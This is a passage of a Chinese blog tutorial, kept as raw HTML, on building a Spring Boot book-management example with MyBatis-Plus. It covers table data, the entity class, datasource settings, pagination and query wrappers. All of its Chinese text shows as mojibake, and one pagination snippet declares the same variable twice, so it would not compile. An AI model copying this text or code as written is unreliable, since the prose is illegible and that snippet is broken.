class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">NULL</span>,  `name` <span class="hljs-type">varchar</span>(<span class="hljs-number">50</span>) <span class="hljs-type">CHARACTER</span> <span class="hljs-keyword">SET</span> utf8 <span class="hljs-keyword">COLLATE</span> utf8_general_ci <span class="hljs-keyword">NULL</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">NULL</span>,  `description` <span class="hljs-type">varchar</span>(<span class="hljs-number">255</span>) <span class="hljs-type">CHARACTER</span> <span class="hljs-keyword">SET</span> utf8 <span class="hljs-keyword">COLLATE</span> utf8_general_ci <span class="hljs-keyword">NULL</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">NULL</span>,  <span class="hljs-keyword">PRIMARY</span> KEY (`id`) <span class="hljs-keyword">USING</span> BTREE) ENGINE <span class="hljs-operator">=</span> InnoDB AUTO_INCREMENT <span class="hljs-operator">=</span> <span class="hljs-number">51</span> <span class="hljs-type">CHARACTER</span> <span class="hljs-keyword">SET</span> <span class="hljs-operator">=</span> utf8 <span class="hljs-keyword">COLLATE</span> <span class="hljs-operator">=</span> utf8_general_ci ROW_FORMAT <span class="hljs-operator">=</span> <span class="hljs-keyword">Dynamic</span>;<span class="hljs-comment">-- ----------------------------</span><span class="hljs-comment">-- Records of tbl_book</span><span class="hljs-comment">-- ----------------------------</span><span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> `tbl_book` <span class="hljs-keyword">VALUES</span> (<span class="hljs-number">1</span>, <span class="hljs-string">&#x27;è®¡ç®—æœºç†è®º&#x27;</span>, <span class="hljs-string">&#x27;Springå®æˆ˜ ç¬¬5ç‰ˆ&#x27;</span>, <span class="hljs-string">&#x27;Springå…¥é—¨ç»å…¸æ•™ç¨‹ï¼Œæ·±å…¥ç†è§£SpringåŸç†æŠ€æœ¯å†…å¹•&#x27;</span>);<span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> `tbl_book` <span class="hljs-keyword">VALUES</span> (<span class="hljs-number">2</span>, <span class="hljs-string">&#x27;è®¡ç®—æœºç†è®º&#x27;</span>, <span class="hljs-string">&#x27;Spring 5æ ¸å¿ƒåŸç†ä¸30ä¸ªç±»æ‰‹å†™å®æˆ˜&#x27;</span>, <span class="hljs-string">&#x27;åå¹´æ²‰æ·€ä¹‹ä½œï¼Œæ‰‹å†™Springç²¾åæ€æƒ³&#x27;</span>);<span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> `tbl_book` <span class="hljs-keyword">VALUES</span> (<span class="hljs-number">3</span>, <span class="hljs-string">&#x27;è®¡ç®—æœºç†è®º&#x27;</span>, <span class="hljs-string">&#x27;Spring 5 è®¾è®¡æ¨¡å¼&#x27;</span>, <span class="hljs-string">&#x27;æ·±å…¥Springæºç å‰–æSpringæºç ä¸­è•´å«çš„10å¤§è®¾è®¡æ¨¡å¼&#x27;</span>);<span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> `tbl_book` <span class="hljs-keyword">VALUES</span> (<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;è®¡ç®—æœºç†è®º&#x27;</span>, <span class="hljs-string">&#x27;Spring MVC+MyBatiså¼€å‘ä»å…¥é—¨åˆ°é¡¹ç›®å®æˆ˜&#x27;</span>, <span class="hljs-string">&#x27;å…¨æ–¹ä½è§£æé¢å‘Webåº”ç”¨çš„è½»é‡çº§æ¡†æ¶ï¼Œå¸¦ä½ æˆä¸ºSpring MVCå¼€å‘é«˜æ‰‹&#x27;</span>);<span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> `tbl_book` <span class="hljs-keyword">VALUES</span> (<span class="hljs-number">5</span>, <span class="hljs-string">&#x27;è®¡ç®—æœºç†è®º&#x27;</span>, <span class="hljs-string">&#x27;è½»é‡çº§Java Webä¼ä¸šåº”ç”¨å®æˆ˜&#x27;</span>, <span class="hljs-string">&#x27;æºç çº§å‰–æSpringæ¡†æ¶ï¼Œé€‚åˆå·²æŒæ¡JavaåŸºç¡€çš„è¯»è€…&#x27;</span>);<span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> `tbl_book` <span class="hljs-keyword">VALUES</span> (<span class="hljs-number">6</span>, <span class="hljs-string">&#x27;è®¡ç®—æœºç†è®º&#x27;</span>, <span class="hljs-string">&#x27;Javaæ ¸å¿ƒæŠ€æœ¯ å·I åŸºç¡€çŸ¥è¯†ï¼ˆåŸä¹¦ç¬¬11ç‰ˆï¼‰&#x27;</span>, <span class="hljs-string">&#x27;Core Java ç¬¬11ç‰ˆï¼ŒJoltå¤§å¥–è·å¥–ä½œå“ï¼Œé’ˆå¯¹Java SE9ã€10ã€11å…¨é¢æ›´æ–°&#x27;</span>);<span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> `tbl_book` <span class="hljs-keyword">VALUES</span> (<span class="hljs-number">7</span>, <span class="hljs-string">&#x27;è®¡ç®—æœºç†è®º&#x27;</span>, <span class="hljs-string">&#x27;æ·±å…¥ç†è§£Javaè™šæ‹Ÿæœº&#x27;</span>, <span class="hljs-string">&#x27;5ä¸ªç»´åº¦å…¨é¢å‰–æJVMï¼Œå¤§å‚é¢è¯•çŸ¥è¯†ç‚¹å…¨è¦†ç›–&#x27;</span>);<span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> `tbl_book` <span class="hljs-keyword">VALUES</span> (<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;è®¡ç®—æœºç†è®º&#x27;</span>, <span class="hljs-string">&#x27;Javaç¼–ç¨‹æ€æƒ³ï¼ˆç¬¬4ç‰ˆï¼‰&#x27;</span>, <span class="hljs-string">&#x27;Javaå­¦ä¹ å¿…è¯»ç»å…¸,æ®¿å ‚çº§è‘—ä½œï¼èµ¢å¾—äº†å…¨çƒç¨‹åºå‘˜çš„å¹¿æ³›èµèª‰&#x27;</span>);<span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> `tbl_book` <span class="hljs-keyword">VALUES</span> (<span class="hljs-number">9</span>, <span class="hljs-string">&#x27;è®¡ç®—æœºç†è®º&#x27;</span>, <span class="hljs-string">&#x27;é›¶åŸºç¡€å­¦Javaï¼ˆå…¨å½©ç‰ˆï¼‰&#x27;</span>, <span class="hljs-string">&#x27;é›¶åŸºç¡€è‡ªå­¦ç¼–ç¨‹çš„å…¥é—¨å›¾ä¹¦ï¼Œç”±æµ…å…¥æ·±ï¼Œè¯¦è§£Javaè¯­è¨€çš„ç¼–ç¨‹æ€æƒ³å’Œæ ¸å¿ƒæŠ€æœ¯&#x27;</span>);<span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> `tbl_book` <span class="hljs-keyword">VALUES</span> (<span class="hljs-number">10</span>, <span class="hljs-string">&#x27;å¸‚åœºè¥é”€&#x27;</span>, <span class="hljs-string">&#x27;ç›´æ’­å°±è¯¥è¿™ä¹ˆåšï¼šä¸»æ’­é«˜æ•ˆæ²Ÿé€šå®æˆ˜æŒ‡å—&#x27;</span>, <span class="hljs-string">&#x27;æå­æŸ’ã€æä½³ç¦ã€è–‡å¨…æˆé•¿ä¸ºç½‘çº¢çš„ç§˜å¯†éƒ½åœ¨ä¹¦ä¸­&#x27;</span>);<span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> `tbl_book` <span class="hljs-keyword">VALUES</span> (<span class="hljs-number">11</span>, <span class="hljs-string">&#x27;å¸‚åœºè¥é”€&#x27;</span>, <span class="hljs-string">&#x27;ç›´æ’­é”€è®²å®æˆ˜ä¸€æœ¬é€š&#x27;</span>, <span class="hljs-string">&#x27;å’Œç§‹å¶ä¸€èµ·å­¦ç³»åˆ—ç½‘ç»œè¥é”€ä¹¦ç±&#x27;</span>);<span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> `tbl_book` <span class="hljs-keyword">VALUES</span> (<span class="hljs-number">12</span>, <span class="hljs-string">&#x27;å¸‚åœºè¥é”€&#x27;</span>, <span class="hljs-string">&#x27;ç›´æ’­å¸¦è´§ï¼šæ·˜å®ã€å¤©çŒ«ç›´æ’­ä»æ–°æ‰‹åˆ°é«˜æ‰‹&#x27;</span>, <span class="hljs-string">&#x27;ä¸€æœ¬æ•™ä½ å¦‚ä½•ç©è½¬ç›´æ’­çš„ä¹¦ï¼Œ10å ‚è¯¾è½»æ¾å®ç°å¸¦è´§æœˆå…¥3W+&#x27;</span>);</code></pre><p><code>tbl_book</code>å¯¹åº”çš„å®ä½“ç±»å¦‚ä¸‹</p><pre><code class="hljs java"><span class="hljs-keyword">import</span> lombok.Data;<span class="hljs-meta">@Data</span><span class="hljs-comment">// Dataæ³¨è§£å¯ä»¥å¯ä»¥å®Œæˆæ‰€æœ‰å±æ€§çš„setter getter toStringï¼Œequalsï¼ŒhashCodeæ–¹æ³•</span><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Book</span> </span>&#123;    <span class="hljs-keyword">private</span> Integer id;    <span class="hljs-keyword">private</span> String type;    <span class="hljs-keyword">private</span> String name;    <span class="hljs-keyword">private</span> String description;&#125;</code></pre><p>ä¸ºäº†æ–¹ä¾¿å¼€å‘ä½¿ç”¨<code>lombok</code>æ³¨è§£ï¼Œåœ¨pom.xmlæ·»åŠ åæ ‡</p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span>    <span class="hljs-comment">&lt;!--lombok--&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.projectlombok<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>lombok<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span></code></pre><h3 id="æ•°æ®å±‚å¼€å‘-CRUD"><a href="#æ•°æ®å±‚å¼€å‘-CRUD" class="headerlink" title="æ•°æ®å±‚å¼€å‘-CRUD"></a>æ•°æ®å±‚å¼€å‘-CRUD</h3><h4 id="1-å¯¼å…¥mybatisplusã€æ•°æ®æºã€mysqlé©±åŠ¨çš„åæ ‡"><a href="#1-å¯¼å…¥mybatisplusã€æ•°æ®æºã€mysqlé©±åŠ¨çš„åæ ‡" class="headerlink" title="(1) å¯¼å…¥mybatisplusã€æ•°æ®æºã€mysqlé©±åŠ¨çš„åæ ‡"></a>(1) å¯¼å…¥mybatisplusã€æ•°æ®æºã€mysqlé©±åŠ¨çš„åæ ‡</h4><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.baomidou<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>mybatis-plus-boot-starter<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.4.3<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.alibaba<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>druid-spring-boot-starter<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.2.6<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>mysql<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>mysql-connector-java<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>runtime<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span></code></pre><h4 id="2-åœ¨application-xmlä¸­é…ç½®æ•°æ®æºä¿¡æ¯"><a href="#2-åœ¨application-xmlä¸­é…ç½®æ•°æ®æºä¿¡æ¯" class="headerlink" title="(2)åœ¨application.xmlä¸­é…ç½®æ•°æ®æºä¿¡æ¯"></a>(2)åœ¨application.xmlä¸­é…ç½®æ•°æ®æºä¿¡æ¯</h4><pre><code class="hljs yaml"><span class="hljs-attr">spring:</span>  <span class="hljs-attr">datasource:</span>    <span class="hljs-attr">druid:</span>      <span class="hljs-attr">driver-class-name:</span> <span class="hljs-string">com.mysql.cj.jdbc.Driver</span>      <span class="hljs-attr">url:</span> <span class="hljs-string">jdbc:mysql://localhost:3306/javastudy?serverTimezone=UTC</span>      <span class="hljs-attr">username:</span> <span class="hljs-string">root</span>      <span class="hljs-attr">password:</span> <span class="hljs-string">root</span></code></pre><p>==è‹¥è¿æ¥æ•°æ®åº“å‡ºç°æ—¶åŒºé”™è¯¯æ—¶å¯ä»¥åŠ ä¸Šå‚æ•°?serverTimezone=UTC==</p><h4 id="3-ä½¿ç”¨MyBatisPlusçš„æ ‡å‡†é€šç”¨æ¥å£BaseMapperåŠ é€Ÿå¼€å‘"><a href="#3-ä½¿ç”¨MyBatisPlusçš„æ ‡å‡†é€šç”¨æ¥å£BaseMapperåŠ é€Ÿå¼€å‘" class="headerlink" title="(3)ä½¿ç”¨MyBatisPlusçš„æ ‡å‡†é€šç”¨æ¥å£BaseMapperåŠ é€Ÿå¼€å‘"></a>(3)ä½¿ç”¨MyBatisPlusçš„æ ‡å‡†é€šç”¨æ¥å£BaseMapperåŠ é€Ÿå¼€å‘</h4><pre><code class="hljs java"><span class="hljs-meta">@Mapper</span><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">interface</span> <span class="hljs-title">BookDao</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">BaseMapper</span>&lt;<span class="hljs-title">Book</span>&gt; </span>&#123;&#125;</code></pre><p>==æ³¨æ„==</p><p>å¯¹æ•°æ®åº“æ“ä½œæ—¶éœ€è¦æŒ‡å®šæ•°æ®è¡¨çš„å‰ç¼€ï¼Œå¹¶è®¾ç½®ä¸»é”®å¢åŠ çš„ç­–ç•¥ï¼Œè¿™é‡Œä½¿ç”¨è‡ªå¢</p><pre><code class="hljs yaml"><span class="hljs-attr">mybatis-plus:</span>  <span class="hljs-attr">global-config:</span>    <span class="hljs-attr">db-config:</span>      <span class="hljs-attr">table-prefix:</span> <span class="hljs-string">tbl_</span><span class="hljs-comment">#è®¾ç½®è¡¨åé€šç”¨å‰ç¼€</span>      <span class="hljs-attr">id-type:</span> <span class="hljs-string">auto</span><span class="hljs-comment">#è®¾ç½®ä¸»é”®idå­—æ®µçš„ç”Ÿæˆç­–ç•¥ä¸ºå‚ç…§æ•°æ®åº“è®¾å®šçš„ç­–ç•¥ï¼Œå½“å‰æ•°æ®åº“è®¾ç½®idç”Ÿæˆç­–ç•¥ä¸ºè‡ªå¢</span></code></pre><p>è®¾ç½®mybatisPlusçš„æ—¥å¿—æ˜¾ç¤ºæ ¼å¼</p><p>åœ¨è¿›è¡Œæ•°æ®å±‚æµ‹è¯•çš„æ—¶å€™ï¼Œå› ä¸ºåŸºç¡€çš„CRUDæ“ä½œå‡ç”±MyBatisPlusç»™æˆ‘ä»¬æä¾›äº†ï¼Œæ‰€ä»¥å°±å‡ºç°äº†ä¸€ä¸ªå±€é¢ï¼Œå¼€å‘è€…ä¸éœ€è¦ä¹¦å†™SQLè¯­å¥äº†ï¼Œè¿™æ ·ç¨‹åºè¿è¡Œçš„æ—¶å€™æ€»æœ‰ä¸€ç§æ„Ÿè§‰ï¼Œä¸€åˆ‡çš„ä¸€åˆ‡éƒ½æ˜¯é»‘ç›’çš„ï¼Œä½œä¸ºå¼€å‘è€…æˆ‘ä»¬å•¥ä¹Ÿä¸çŸ¥é“å°±å®Œäº†ã€‚å¦‚æœç¨‹åºæ­£å¸¸è¿è¡Œè¿˜å¥½ï¼Œå¦‚æœæŠ¥é”™äº†ï¼Œè¿™ä¸ªæ—¶å€™å°±å¾ˆå´©æºƒï¼Œä½ ç”šè‡³éƒ½ä¸çŸ¥é“ä»ä½•ä¸‹æ‰‹ï¼Œå› ä¸ºä¼ é€’å‚æ•°ã€å°è£…SQLè¯­å¥è¿™äº›æ“ä½œå®Œå…¨ä¸æ˜¯ä½ å¼€å‘å‡ºæ¥çš„ï¼Œæ‰€ä»¥æŸ¥çœ‹æ‰§è¡ŒæœŸè¿è¡Œçš„SQLè¯­å¥å°±æˆä¸ºå½“åŠ¡ä¹‹æ€¥ã€‚</p><p>å¯ä»¥æ·»åŠ æ—¥å¿—é…ç½®</p><pre><code class="hljs yaml"><span class="hljs-attr">mybatis-plus:</span>  <span class="hljs-attr">global-config:</span>    <span class="hljs-attr">db-config:</span>      <span class="hljs-attr">table-prefix:</span> <span class="hljs-string">tbl_</span>      <span class="hljs-attr">id-type:</span> <span class="hljs-string">auto</span>  <span class="hljs-attr">configuration:</span> <span class="hljs-comment"># è®¾ç½®mybatisplusçš„æ—¥å¿—ä¸ºæ ‡å‡†è¾“å…¥æ ¼å¼ å¯ä»¥æ˜¾ç¤ºæ‰§è¡Œçš„sqlè¯­å¥ã€æºå¸¦çš„å‚æ•°ä¸æŸ¥è¯¢ç»“æœ</span>    <span class="hljs-attr">log-impl:</span> <span class="hljs-string">org.apache.ibatis.logging.stdout.StdOutImpl</span></code></pre><h3 id="æ•°æ®å±‚å¼€å‘-åˆ†é¡µåŠŸèƒ½"><a href="#æ•°æ®å±‚å¼€å‘-åˆ†é¡µåŠŸèƒ½" class="headerlink" title="æ•°æ®å±‚å¼€å‘-åˆ†é¡µåŠŸèƒ½"></a>æ•°æ®å±‚å¼€å‘-åˆ†é¡µåŠŸèƒ½</h3><p>Mybatis-plusä¸­å·²ç»å®ç°äº†åˆ†é¡µåŠŸèƒ½çš„APIï¼Œå…·ä½“ä½¿ç”¨æ–¹æ³•å¦‚ä¸‹</p><ul><li>åˆ›å»ºPageå¯¹è±¡ï¼Œåˆ©ç”¨æ„é€ æ–¹æ³•å®ä¾‹åŒ–æ‰€éœ€çš„å‚æ•°currentPageï¼ŒpageSize</li><li>ä½¿ç”¨Mapper.selectPage()ä½¿ç”¨åˆ†é¡µæŸ¥è¯¢åŠŸèƒ½</li></ul><pre><code class="hljs java">IPage page = <span class="hljs-keyword">new</span> Page(<span class="hljs-number">2</span>,<span class="hljs-number">5</span>);IPage page = bookDao.selectPage(page, <span class="hljs-keyword">null</span>);</code></pre><p>ä½¿ç”¨åˆ†é¡µæŸ¥è¯¢è¿”å›çš„ç»“æœä»æ˜¯Pageç±»å‹ï¼Œå…¶ä¸­åŒ…å«å¤šæ¡æ•°æ®ï¼Œå¹¶ä¸”ä½¿ç”¨è¿”å›çš„ç»“æœå¯ä»¥è·å–åˆ°åˆ†é¡µçš„è¯¦ç»†ä¿¡æ¯ï¼ŒåŒ…æ‹¬å½“å‰é¡µï¼Œæ€»è®°å½•æ•°ï¼Œå½“å‰é¡µè®°å½•æ•°ï¼Œå‰ä¸€é¡µç­‰</p><pre><code class="hljs java"><span class="hljs-meta">@Test</span><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">testGetPage</span><span class="hljs-params">()</span></span>&#123;    IPage page = <span class="hljs-keyword">new</span> Page(<span class="hljs-number">2</span>,<span class="hljs-number">5</span>);    bookDao.selectPage(page, <span class="hljs-keyword">null</span>);    System.out.println(page.getCurrent());<span class="hljs-comment">//å½“å‰é¡µç å€¼</span>    System.out.println(page.getSize());<span class="hljs-comment">//æ¯é¡µæ˜¾ç¤ºæ•°</span>    System.out.println(page.getTotal());<span class="hljs-comment">//æ•°æ®æ€»é‡</span>    System.out.println(page.getPages());<span class="hljs-comment">//æ€»é¡µæ•°</span>    System.out.println(page.getRecords());<span class="hljs-comment">//è¯¦ç»†æ•°æ®</span>&#125;</code></pre><p>ä½†æ˜¯åœ¨ä½¿ç”¨åˆ†é¡µåŠŸèƒ½æ—¶éœ€è¦è®¾ç½®ä¸€ä¸ªæ‹¦æˆªå™¨ï¼ŒåŸºç¡€æ“ä½œä¸­æœ‰æŸ¥è¯¢å…¨éƒ¨çš„åŠŸèƒ½ï¼Œè€Œåœ¨è¿™ä¸ªåŸºç¡€ä¸Šåªéœ€è¦å‡çº§ä¸€ä¸‹ï¼ˆPLUSï¼‰å°±å¯ä»¥å¾—åˆ°åˆ†é¡µæ“ä½œã€‚æ‰€ä»¥MyBatisPluså°†åˆ†é¡µæ“ä½œåšæˆäº†ä¸€ä¸ªå¼€å…³ï¼Œä½ ç”¨åˆ†é¡µåŠŸèƒ½å°±æŠŠå¼€å…³å¼€å¯ï¼Œä¸ç”¨å°±ä¸éœ€è¦å¼€å¯è¿™ä¸ªå¼€å…³ã€‚è€Œæˆ‘ä»¬ç°åœ¨æ²¡æœ‰å¼€å¯è¿™ä¸ªå¼€å…³ï¼Œæ‰€ä»¥åˆ†é¡µæ“ä½œæ˜¯æ²¡æœ‰çš„ã€‚è¿™ä¸ªå¼€å…³æ˜¯é€šè¿‡MyBatisPlusçš„æ‹¦æˆªå™¨çš„å½¢å¼å­˜åœ¨çš„ã€‚</p><pre><code class="hljs java"><span class="hljs-meta">@Configuration</span><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MPConfig</span> </span>&#123;    <span class="hljs-meta">@Bean</span>    <span class="hljs-function"><span class="hljs-keyword">public</span> MybatisPlusInterceptor <span class="hljs-title">mybatisPlusInterceptor</span><span class="hljs-params">()</span></span>&#123;        MybatisPlusInterceptor interceptor = <span class="hljs-keyword">new</span> MybatisPlusInterceptor();        interceptor.addInnerInterceptor(<span class="hljs-keyword">new</span> PaginationInnerInterceptor());               <span class="hljs-comment">// å½“éœ€è¦å…¶ä»–çš„æ‹¦æˆªå™¨æ—¶ç»§ç»­addInnerInterceptorå³å¯</span>       <span class="hljs-comment">// å¦‚æœåæœŸå¼€å‘å…¶ä»–åŠŸèƒ½ï¼Œéœ€è¦æ·»åŠ å…¨æ–°çš„æ‹¦æˆªå™¨ï¼ŒæŒ‰ç…§ç¬¬äºŒè¡Œçš„æ ¼å¼ç»§ç»­addè¿›å»æ–°çš„æ‹¦æˆªå™¨å°±å¯ä»¥äº†ã€‚</span>        <span class="hljs-keyword">return</span> interceptor;    &#125;&#125;</code></pre><h3 id="æ•°æ®å±‚å¼€å‘-æ¡ä»¶æŸ¥è¯¢"><a href="#æ•°æ®å±‚å¼€å‘-æ¡ä»¶æŸ¥è¯¢" class="headerlink" title="æ•°æ®å±‚å¼€å‘-æ¡ä»¶æŸ¥è¯¢"></a>æ•°æ®å±‚å¼€å‘-æ¡ä»¶æŸ¥è¯¢</h3><p>MyBatisPluså°†è¿™äº›æ“ä½œéƒ½åˆ¶ä½œæˆAPIæ¥å£ï¼Œè°ƒç”¨ä¸€ä¸ªåˆä¸€ä¸ªçš„æ–¹æ³•å°±å¯ä»¥å®ç°å„ç§æ¡ä»¶çš„æ‹¼è£…ã€‚ä½¿ç”¨æ–¹æ³•å¦‚ä¸‹</p><pre><code class="hljs java"><span class="hljs-meta">@Test</span><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">testGetBy</span><span class="hljs-params">()</span></span>&#123;    QueryWrapper&lt;Book&gt; qw = <span class="hljs-keyword">new</span> QueryWrapper&lt;&gt;();    qw.like(<span class="hljs-string">&quot;name&quot;</span>,<span class="hljs-string">&quot;Spring&quot;</span>);    bookDao.selectList(qw);&#125;</code></pre><p>å…¶ä¸­ç¬¬ä¸€å¥QueryWrapperå¯¹è±¡æ˜¯ä¸€ä¸ªç”¨äºå°è£…æŸ¥è¯¢æ¡ä»¶çš„å¯¹è±¡ï¼Œè¯¥å¯¹è±¡å¯ä»¥åŠ¨æ€ä½¿ç”¨APIè°ƒç”¨çš„æ–¹æ³•æ·»åŠ æ¡ä»¶ï¼Œæœ€ç»ˆè½¬åŒ–æˆå¯¹åº”çš„SQLè¯­å¥ã€‚ç¬¬äºŒå¥å°±æ˜¯ä¸€ä¸ªæ¡ä»¶äº†ï¼Œéœ€è¦ä»€ä¹ˆæ¡ä»¶ï¼Œä½¿ç”¨QueryWapperå¯¹è±¡ç›´æ¥è°ƒç”¨å¯¹åº”æ“ä½œå³å¯ã€‚ä¸Šè¿°ä»£ç ä¸­æ‰§è¡Œçš„SQLè¯­å¥ä¸º<code>select * from tbl_book where name like &#39;%spring%&#39;</code>ï¼ŒMPè‡ªåŠ¨å¯¹æŸ¥è¯¢æ¡ä»¶è¿›è¡Œå¤„ç†ï¼Œçœå»äº†æ‰‹åŠ¨å¤„ç†çš„ä¸€æ­¥ã€‚</p><p>MyBatisPlusé’ˆå¯¹å­—æ®µæ£€æŸ¥è¿›è¡Œäº†åŠŸèƒ½å‡çº§ï¼Œå…¨é¢æ”¯æŒLambdaè¡¨è¾¾å¼ï¼Œå°±æœ‰äº†ä¸‹é¢è¿™ç»„APIã€‚ç”±QueryWrapperå¯¹è±¡å‡çº§ä¸ºLambdaQueryWrapperå¯¹è±¡ï¼Œå…¶ä½¿ç”¨æ–¹æ³•å¦‚ä¸‹ï¼š</p><pre><code class="hljs java"><span class="hljs-meta">@Test</span><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">testGetBy2</span><span class="hljs-params">()</span></span>&#123;    String name = <span class="hljs-string">&quot;1&quot;</span>;    LambdaQueryWrapper&lt;Book&gt; lqw = <span class="hljs-keyword">new</span> LambdaQueryWrapper&lt;Book&gt;();    lqw.like(Book::getName,name);    bookDao.selectList(lqw);&#125;</code></pre><p>ä¸ºäº†ä¾¿äºå¼€å‘è€…åŠ¨æ€æ‹¼å†™SQLï¼Œé˜²æ­¢å°†nullæ•°æ®ä½œä¸ºæ¡ä»¶ä½¿ç”¨ï¼ŒMyBatisPlusè¿˜æä¾›äº†åŠ¨æ€æ‹¼è£…SQLçš„å¿«æ·ä¹¦å†™æ–¹å¼ã€‚</p><pre><code class="hljs java"><span class="hljs-meta">@Test</span><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">testGetBy2</span><span class="hljs-params">()</span></span>&#123;    String name = <span class="hljs-string">&quot;1&quot;</span>;    LambdaQueryWrapper&lt;Book&gt; lqw = <span class="hljs-keyword">new</span> LambdaQueryWrapper&lt;Book&gt;();    <span class="hljs-comment">//if(name != null) lqw.like(Book::getName,name);//æ–¹å¼ä¸€ï¼šJAVAä»£ç æ§åˆ¶</span>    lqw.like(name != <span class="hljs-keyword">null</span>,Book::getName,name);<span class="hljs-comment">//æ–¹å¼äºŒï¼šAPIæ¥å£æä¾›æ§åˆ¶å¼€å…³</span>    bookDao.selectList(lqw);&#125;</code></pre><h3 id="ä¸šåŠ¡å±‚å¼€å‘"><a href="#ä¸šåŠ¡å±‚å¼€å‘" class="headerlink" title="ä¸šåŠ¡å±‚å¼€å‘"></a>ä¸šåŠ¡å±‚å¼€å‘</h3><p>å®šä¹‰ä¸šåŠ¡å±‚çš„æ¥å£<code>BookService</code></p><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.sunzy.service;<span class="hljs-keyword">import</span> com.baomidou.mybatisplus.core.metadata.IPage;<span class="hljs-keyword">import</span> com.sunzy.domain.Book;<span class="hljs-keyword">import</span> java.util.List;<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">interface</span> <span class="hljs-title">BookService</span> </span>&#123;    <span class="hljs-function"><span class="hljs-keyword">boolean</span> <span class="hljs-title">save</span><span class="hljs-params">(Book book)</span></span>;    <span class="hljs-function"><span class="hljs-keyword">boolean</span> <span class="hljs-title">update</span><span class="hljs-params">(Book book)</span></span>;    <span class="hljs-function"><span class="hljs-keyword">boolean</span> <span class="hljs-title">delete</span><span class="hljs-params">(Integer id)</span></span>;    <span class="hljs-function">List&lt;Book&gt; <span class="hljs-title">getAll</span><span class="hljs-params">()</span></span>;    <span class="hljs-function">Book <span class="hljs-title">getById</span><span class="hljs-params">(Integer id)</span></span>;    <span class="hljs-function">IPage&lt;Book&gt; <span class="hljs-title">getPage</span><span class="hljs-params">(<span class="hljs-keyword">int</span> currentPage, <span class="hljs-keyword">int</span> pageSize)</span></span>;&#125;</code></pre><p>ä¸šåŠ¡å±‚æ¥å£çš„å®ç°ç±»</p><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.sunzy.service.impl;<span class="hljs-keyword">import</span> com.baomidou.mybatisplus.core.metadata.IPage;<span class="hljs-keyword">import</span> com.baomidou.mybatisplus.extension.plugins.pagination.Page;<span class="hljs-keyword">import</span> com.sunzy.dao.BookDao;<span class="hljs-keyword">import</span> com.sunzy.domain.Book;<span class="hljs-keyword">import</span> com.sunzy.service.BookService;<span class="hljs-keyword">import</span> org.springframework.beans.factory.annotation.Autowired;<span class="hljs-keyword">import</span> org.springframework.stereotype.Service;<span 